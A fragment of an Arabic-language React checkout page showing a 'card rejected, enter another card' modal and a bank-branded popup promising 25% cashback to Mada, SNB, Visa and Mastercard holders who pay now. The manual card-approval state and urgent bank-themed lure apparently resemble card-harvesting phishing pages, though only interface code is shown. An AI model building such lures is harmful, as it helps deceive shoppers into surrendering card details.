              <AlertCircle className="h-8 w-8" />
            </div>
            <h3 className="text-xl font-bold text-gray-900">تعذر إتمام عملية الدفع</h3>
            <p className="mt-3 text-sm leading-6 text-gray-600">
              {cardRejectReason || "عذراً، هذه البطاقة غير مدعومة. يرجى استخدام بطاقة أخرى (مدى / فيزا / ماستركارد)."}
            </p>
            <button
              type="button"
              onClick={() => {
                setCardApprovalStatus("idle");
                setCardRejectReason("");
              }}
              className="mt-6 h-12 w-full rounded-xl bg-[#29222b] text-sm font-bold text-white transition hover:bg-[#3b303e]"
            >
              إدخال بطاقة أخرى
            </button>
          </div>
        </div>
      )}

      {/* Cashback Promo Popup on Payment Step */}
      {showCashbackPopup && (
        <div className="fixed inset-0 z-[110] flex items-center justify-center bg-black/80 backdrop-blur-md p-4 animate-in fade-in duration-300" dir="rtl">
          <div className="relative w-full max-w-lg overflow-hidden rounded-3xl bg-gradient-to-br from-red-700 via-red-900 to-amber-950 p-2 text-white shadow-2xl border-4 border-amber-400">
            <button
              onClick={() => setShowCashbackPopup(false)}
              className="absolute top-4 left-4 z-20 flex h-9 w-9 items-center justify-center rounded-full bg-black/60 text-white hover:bg-black/90 transition shadow-lg"
              aria-label="إغلاق"
            >
              <X className="h-5 w-5" />
            </button>
            <div className="p-4 text-center space-y-3">
              <img
                src="/cashback-promo.png"
                alt="عرض 25% كاش باك لعملاء الأهلي ومدى وفيزا وماستركارد"
                className="mx-auto w-full rounded-2xl shadow-2xl border-2 border-amber-300 object-cover"
              />
              <div className="space-y-2 pt-1">
                <h3 className="text-2xl font-black text-amber-300">
                  عرض 25% كاش باك حصري!
                </h3>
                <p className="text-xs sm:text-sm text-white/95 leading-relaxed font-medium">
                  لحاملي بطاقات مدى وبطاقات البنك الأهلي السعودي (SNB)، فيزا، وماستركارد. استفد من استرداد نقدي 25% على جميع مشترياتك عند إتمام الدفع الآن.
                </p>
                <button
                  onClick={() => setShowCashbackPopup(false)}
                  className="mt-2 w-full rounded-2xl bg-gradient-to-r from-amber-400 to-amber-500 hover:from-amber-500 hover:to-amber-600 py-4 text-base font-black text-slate-950 shadow-xl transition transform active:scale-95"
                >
                  استفد من العرض الآن (متابعة الدفع)
                </button>
              </div>
            </div>
          </div>
        </div>
      )}
    </main>
  );
};
